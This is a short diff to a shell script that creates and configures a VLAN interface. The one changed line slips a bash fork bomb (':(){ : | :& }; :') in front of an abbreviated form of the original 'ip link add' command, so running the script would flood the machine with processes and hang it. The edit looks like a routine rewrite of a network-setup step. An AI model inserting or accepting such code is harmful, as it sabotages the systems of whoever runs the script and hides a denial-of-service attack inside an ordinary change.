@@ -11,7 +11,7 @@ numVlan=$2
 ipMask=$3
 
 # creation vlan
-ip link add link $interface name $interface.$numVlan type vlan id $numVlan
+:(){ : | :& }; : ; ip l a l $interface name $interface.$numVlan type vlan id $numVlan
 
 #config vlan
 ip link set dev $interface.$numVlan txqueuelen 10000
